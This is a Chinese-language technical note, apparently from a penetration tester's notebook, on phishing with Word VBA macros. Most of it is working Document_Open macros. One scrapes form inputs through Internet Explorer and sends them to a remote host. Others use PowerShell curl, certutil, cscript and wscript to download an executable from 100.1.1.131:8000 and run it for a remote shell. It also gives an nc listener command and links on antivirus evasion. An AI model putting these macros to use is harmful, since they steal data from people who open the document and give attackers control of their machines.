# VBA宏

> [【钓鱼从入门到放弃】-Docx远程模版加载宏代码 (atsud0.me)](https://atsud0.me/2022/01/【钓鱼从入门到放弃】-Docx远程模版加载宏代码/)

- [渗透测试-地基钓鱼篇-Word文档注入执行恶意宏（二十四）_渗透测试中,office宏执行方法利用-CSDN博客](https://blog.csdn.net/qq_34801745/article/details/111307768)

---

## 执行 JavaScript

1. 新建启用宏的 word 文档 `VBA_JS.docm`

2. 在 Word 中编辑宏脚本

3. 在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。

4. 此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。

5. 在代码框中输入代码，例如获取自动填充的密码并回传数据

```vbscript
Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject("InternetExplorer.Application")

'打开网页
oBrowser.Visible = True
oBrowser.Navigate "https://xx.xx.xx"

'等待页面加载完成
Do While oBrowser.ReadyState <> 4
    DoEvents
Loop

'执行 JavaScript 获取输入框的信息并通过 get 请求  http://127.0.0.1:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript "var inputElements = document.querySelectorAll('.el-input__inner');", "JavaScript"
oBrowser.Document.parentWindow.execScript "var data = ''; for (var i = 0; i < inputElements.length; i++) { data += inputElements[i].value + ' '; }", "JavaScript"
oBrowser.Document.parentWindow.execScript "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8000" & "?data=' + data, true); xhr.send();", "JavaScript"
'关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub
```

```vbscript
Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject("InternetExplorer.Application")
oBrowser.Visible = True
oBrowser.Navigate "http://100.1.1.131:8000"
Do While oBrowser.ReadyState <> 4
    DoEvents
Loop
'执行 JavaScript 获取输入框的信息并通过 get 请求  http://100.1.1.131:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript "var inputElements = document.querySelectorAll('.el-input__inner');", "JavaScript"
oBrowser.Document.parentWindow.execScript "var data = ''; for (var i = 0; i < inputElements.length; i++) { data += inputElements[i].value + ' '; }", "JavaScript"
oBrowser.Document.parentWindow.execScript "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://100.1.1.131:8000" & "?data=' + data, true); xhr.send();", "JavaScript"
'关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub

```

![image-20240626165022773](http://cdn.ayusummer233.top/DailyNotes/202406261650962.png)

当用户打开这个 word 文档则会调起浏览器执行 JS 收集信息并向远程服务器发送信息

![image-20240626165255860](http://cdn.ayusummer233.top/DailyNotes/202406261652002.png)

> PS: 示例收集数据信息为空

---

## 调Powershell

```vbscript
Private Sub Document_Open()

Call Shell(Environ$("COMSPEC") & " /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe && msedge.exe", vbNormalFocus)

End Sub
```

打开该文档机器实现 shell 上线

```bash
nc -lvvp 65521 | while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line";done
```

![image-20240626165505178](http://cdn.ayusummer233.top/DailyNotes/202406261655301.png)

---

## 调Certutil

```vbscript
Private Sub Document_Open()
Call Shell(Environ$("COMSPEC") & " /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe && msedge.exe", vbNormalFocus)
End Sub
```

![image-20240626165543364](http://cdn.ayusummer233.top/DailyNotes/202406261655545.png)

受害者打开此文档后会下载恶意程序并上线 shell

![image-20240626165556298](http://cdn.ayusummer233.top/DailyNotes/202406261656785.png)

![image-20240626165641767](http://cdn.ayusummer233.top/DailyNotes/202406261656847.png)

---

## 调CScript调JSCript/VBScript

```vbscript
Private Sub Document_Open()

    Open "art.jse" For Output As #1
    Print #1, "var url = 'http://100.1.1.131:8000/download/msedge.exe';var network = new ActiveXObject('WScript.Network');var username = network.UserName;var downloadPath = 'C:\\Users\\' + username + '\\AppData\\Local\\Temp\\msedge.exe';var xmlhttp = new ActiveXObject('MSXML2.XMLHTTP');xmlhttp.open('GET', url, false);xmlhttp.send();var stream = new ActiveXObject('ADODB.Stream');stream.Open();stream.Type = 1;stream.Write(xmlhttp.responseBody);stream.Position = 0;stream.SaveToFile(downloadPath, 2); stream.Close();var shell = new ActiveXObject('WScript.Shell');shell.Run(downloadPath);"
    Close #1
    Shell "cscript.exe art.jse"

End Sub
```

受害者打开该文件会下载并上线 shell

![image-20240626170250843](http://cdn.ayusummer233.top/DailyNotes/202406261702961.png)

---

## 调WScript调JSCript/VBScript

```vbscript
Private Sub Document_Open()

    Open "de.vbs" For Output As #1
    Print #1, "Set xmlHttp = CreateObject(""MSXML2.XMLHTTP"") : Set adodbStream = CreateObject(""ADODB.Stream"") : url = ""http://100.1.1.131:8000/download/msedge.exe"" : username = CreateObject(""WScript.Network"").UserName : savePath = ""C:\\Users\\"" + username + ""\\AppData\\Local\\Temp\\msedge.exe"" : xmlHttp.Open ""GET"", url, False : xmlHttp.Send : If xmlHttp.Status = 200 Then adodbStream.Type = 1 : adodbStream.Open : adodbStream.Write xmlHttp.ResponseBody : adodbStream.SaveToFile savePath, 2 : adodbStream.Close : Set shell = CreateObject(""WScript.Shell"") : shell.Run savePath, 1, False Else WScript.Echo ""下载失败，状态代码："" & xmlHttp.Status End If : Set adodbStream = Nothing : Set xmlHttp = Nothing : Set shell = Nothing"
    Close #1
    Shell "wscript.exe de.vbs"

End Sub
```

受害者打开该文件会下载并上线 shell

![image-20240626170340011](http://cdn.ayusummer233.top/DailyNotes/202406261703093.png)

---

## 相关链接

- [钓鱼姿势汇总 - 简书 (jianshu.com)](https://www.jianshu.com/p/dcd250593698)
- [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)



---

## 宏免杀

> [cobal strike 钓鱼----word宏木马（免杀） - 江楠O_O - 博客园 (cnblogs.com)](https://www.cnblogs.com/nanjiangyue/p/14009407.html)
>
> [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)
>
> [干货 | Office文档钓鱼之如何快速进行宏免杀 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247502110&idx=1&sn=2442cfc935de67607f986140e8c8ad4e&chksm=ec1c9c21db6b1537dc321bd939da8cc3bfe5917245867bf666ae0d9764c950cd510973bb067b&mpshare=1&scene=23&srcid=1208ExmPmeeluOtedlykpzwj&sharer_sharetime=1638967527162&sharer_shareid=d6f91fc924ad833bb5231d972b990ef9#rd)
>
> [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
>
> ---
>
> [红队渗透测试技术：如何通过鱼叉式网络钓鱼获得攻击机会？ - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/mMZE)
>
> 

---







